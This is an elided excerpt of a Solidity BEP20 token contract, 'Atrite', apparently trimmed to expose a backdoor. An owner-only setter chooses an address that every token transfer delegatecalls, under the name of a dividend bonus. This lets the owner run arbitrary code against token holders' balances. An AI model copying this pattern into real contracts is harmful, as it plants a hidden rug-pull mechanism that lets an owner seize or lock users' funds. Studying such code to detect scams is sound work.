...
contract Atrite is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Atrite';
  ...
  */
  ...
  function claimDividendKOM(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_KOM.delegatecall(
  ...
  function SetBonusKOM(address c) public onlyOwner {
    C_KOM = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendKOM(sender, recipient, amount);   
